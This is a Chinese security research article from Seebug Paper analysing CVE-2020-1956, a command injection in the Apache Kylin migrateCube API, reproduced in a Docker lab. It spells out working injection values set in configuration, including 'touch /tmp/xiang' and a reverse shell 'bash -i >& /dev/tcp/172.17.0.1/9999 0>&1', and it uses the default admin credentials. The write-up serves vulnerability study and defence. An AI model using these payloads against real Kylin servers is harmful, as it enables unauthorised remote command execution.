**作者：香依香偎**  
**原文链接：[闻道解惑（wendao_jiehuo）](https://mp.weixin.qq.com/s/QzlHYST0kIqjNV-hnosyAw)**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：paper@seebug.org**

## CVE-2020-1956

2020年5月22日， **CNVD** 通报了 **Apache Kylin** 存在命令注入漏洞 **CVE-2020-1956** ，地址在
<http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133> 。

> **Apache Kylin** 是美国 **Apache** 软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供
> **Hadoop/Spark** 之上的 **SQL** 查询接口及多维分析（ **OLAP** ）等功能。
>
> **Apache Kylin** 中的静态 **API**
> 存在安全漏洞。攻击者可借助特制输入利用该漏洞在系统上执行任意OS命令。以下产品及版本受到影响： **Apache Kylin**
> 2.3.0版本至2.3.2版本，2.4.0版本至2.4.1版本，2.5.0版本至2.5.2版本，2.6.0版本至2.6.5版本，3.0.0-alpha版本，3.0.0-alpha2版本，3.0.0-beta版本，3.0.0版本，3.0.1版本。

下面就来分析一下这个漏洞。

## 一、搭建环境

**Kylin** 的环境并不好搭建，包括 **Hadoop、Hbase、Spark、Kafka** 等等一系列的组件需要安装配置。幸好，
**Kylin** 官网文档 <http://kylin.apache.org/cn/docs/install/kylin_docker.html> 提供了
**Docker** 环境的启动指南，分别执行这两个命令即可一键启动。

    
    
    docker pull apachekylin/apache-kylin-standalone:3.0.1
    
    
    docker run -d \
    -m 8G \
    -p 7070:7070 \
    -p 8088:8088 \
    -p 50070:50070 \
    -p 8032:8032 \
    -p 8042:8042 \
    -p 16010:16010 \
    apachekylin/apache-kylin-standalone:3.0.1

![](https://images.seebug.org/content/images/2020/06/7d4cc8be-881e-446c-a6e3-383c0844e287.png-w331s)

使用默认密码 **admin/KYLIN** 登录，就能看到已经配置好的模型（ **models** ），环境搭建大功告成。

![](https://images.seebug.org/content/images/2020/06/21fdb76f-ea9c-4390-8562-6da6dbbc4d64.png-w331s)

## 二、Migrate Cube

这个漏洞的补丁代码在 **github** 上，地址是
<https://github.com/apache/kylin/commit/9cc3793ab2f2f0053c467a9b3f38cb7791cd436a#>
。

![](https://images.seebug.org/content/images/2020/06/819a8eee-0ade-49bf-9759-2f2280069e94.png-w331s)

可以看出，漏洞点在 **CubeService.java** 中的 **migrateCube()** 函数，漏洞原因是使用
**String.format()** 格式化待执行的系统命令且未做过滤，导致命令内容可被注入，涉及的参数包括 **srcCfgUri** 、
**dstCfgUri** 、 **projectName** 三个。

**Migrate Cube** 是什么？在官网的文档的 [Restful
章节](http://kylin.apache.org/cn/docs/howto/howto_use_restapi.html#migrate-cube
"Restful 章节") 中，可以看到这个 Restful接口的描述：

![](https://images.seebug.org/content/images/2020/06/39e575d1-76bf-4783-a112-beb047cb0e08.png-w331s)

接口中显示需要两个路径入参，分别是 **cube** 和 **project** 。回看 **kylin** 页面上的表格里，已经显示了 **cube
name** 和对应的 **Project** 。

![](https://images.seebug.org/content/images/2020/06/f94c86ca-fe43-4d97-8cb0-1245cd8d4263.png-w331s)

我们选择第一行记录中的 **cube** ： **kylin_sales_cube** 和对应的 **Project** ： **learn_kylin**
作为路径参数，POST 这个报文看看。

![](https://images.seebug.org/content/images/2020/06/f579a955-17a4-4dc0-bb57-34f9ec381aa1.png-w331s)

收到错误响应，提示 **One click migration is disable** 。

![](https://images.seebug.org/content/images/2020/06/7fa899e7-2824-49e6-a87b-9ac18b0a4beb.png-w331s)

**One click migration is disable** 的提示，看起来有点眼熟。回看一眼 **patch code**
，嘿，原来这个错误提示就在 **migrateCube()** 函数的开头呀。

![](https://images.seebug.org/content/images/2020/06/30f4bf94-5f97-4f04-a0ec-782da24f6c43.png-w331s)

对应的配置检查函数 **isAllowAutoMigrateCube()** 在 **KylinConfigBase.java** 中，从配置项中读取了
**kylin.tool.auto-migrate-cube.enabled** ，默认值为 **FALSE** 。

![](https://images.seebug.org/content/images/2020/06/9e5c45fe-51c3-40fa-a6df-77b6911ed97b.png-w331s)

如果要把配置修改为 **true** ，有两个办法。

  * 方法一：使用 **docker exec -it bash** 命令进入容器，修改其中 **conf/kylin.properties** 文件，增加 **kylin.tool.auto-migrate-cube.enabled=true** 的配置项，然后在容器中使用 **bin/kylin stop** 和 **bin/kylin start** 命令重启 **kylin** 。

![](https://images.seebug.org/content/images/2020/06/c52155a6-8b02-4ae6-bb35-dd4206cf68f9.png-w331s)

  * 方法二：在 **WEB** 界面上点击 **SYSTEM** 和 **SET Config** ，手动输入配置项名称 **kylin.tool.auto-migrate-cube.enabled** 和值 **True** 。

![](https://images.seebug.org/content/images/2020/06/3e85f823-cb0c-42c8-8061-d9e13b0a2ec8.png-w331s)

![](https://images.seebug.org/content/images/2020/06/a350095d-fa41-4d4c-a7ee-36b990a7adf6.png-w331s)

方法一是永久有效，只是需要重启 **kylin** 进程；方法二立即生效但进程重启或 **Reload Config**
之后就失效。我们选择相对简单一些的方法二来操作。

![](https://images.seebug.org/content/images/2020/06/18ab4921-1ef5-4ae6-b8f0-c618d7d76dbe.png-w331s)

修改完配置之后，再次发送 **POST Migrate Cube** 的报文，这次的报错提示为 **Source configuration should
not be empty.**

![](https://images.seebug.org/content/images/2020/06/11240fbb-59ff-47a8-a24f-3caadeac8bc6.png-w331s)

![](https://images.seebug.org/content/images/2020/06/e18b8d3c-1586-44a0-a563-d967771ad67c.png-w331s)

对应代码中的 **srcCfgUri** 和 **dstCfgUri** 的非空检查。

![](https://images.seebug.org/content/images/2020/06/89c4d539-35ae-4242-9c5a-411809f7630d.png-w331s)

这两个值同样来自于配置项，分别是 **kylin.tool.auto-migrate-cube.src-config** 和
**kylin.tool.auto-migrate-cube.dest-config** 。

![](https://images.seebug.org/content/images/2020/06/8f3844e2-d033-4905-b143-9e935657e817.png-w331s)

我们可以用前面配置 **kylin.tool.auto-migrate-cube.enabled**
同样的方法来配置这两个值。不过，在配置之前，你有没有注意到，这两个值，就是命令注入的关键参数呢？

![](https://images.seebug.org/content/images/2020/06/b00d30b9-e32a-4459-9a63-8eddb4912809.png-w331s)

## 三、命令注入

好，用 **destCfgUri** 来注入试试。在界面上 **Set Config** ，把 **srcCfgUri** 配置为
**/home/admin/apache-kylin-3.0.1-bin-hbase1x/conf/kylin.propertie** ，将
**destCfgUri** 配置为 **/tmp/kylin.properties kylin_sales_cube learn_kylin true
true true true; touch /tmp/xiang; echo** 。注意其中注入了 **touch /tmp/xiang** 的系统命令。

![](https://images.seebug.org/content/images/2020/06/982060b7-070c-44ea-8594-aa335ecd1964.png-w331s)

重新发起 **Migrate Cube** 的请求。

![](https://images.seebug.org/content/images/2020/06/6c4ef751-5e09-4594-8b60-856a828f305b.png-w331s)

收到 **200** 成功响应。

![](https://images.seebug.org/content/images/2020/06/df0e5f06-9816-427e-890f-684091eb24d9.png-w331s)

查看 **docker** 容器，注入的命令 **touch /tmp/xiang** 已经成功执行。

![](https://images.seebug.org/content/images/2020/06/60f65037-647e-49db-b093-77c03228dfbb.png-w331s)

可以反弹 **shell** 么？当然可以。将 **kylin.tool.auto-migrate-cube.dest-config** 配置为
**/tmp/kylin.properties kylin_sales_cube learn_kylin true true true true; bash
-i >& /dev/tcp/172.17.0.1/9999 0>&1; echo** 。其中注入的命令从 **touch /tmp/xiang**
换成了反弹 **shell** 的命令 **bash -i >& /dev/tcp/172.17.0.1/9999 0>&1**，反弹到宿主机
**172.17.0.1** 上。

![](https://images.seebug.org/content/images/2020/06/be0236a7-aaee-4ade-889d-bf3a80c75abe.png-w331s)

在宿主机上启动监听。

![](https://images.seebug.org/content/images/2020/06/f578e596-bab5-42bc-8845-bec8163a1326.png-w331s)

再发送一次 **Migrate Cube** 报文，等待几秒即可获取反弹 **shell** 。

![](https://images.seebug.org/content/images/2020/06/28bd13d3-0a74-4078-bb6a-ed38e478beb8.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1237/>

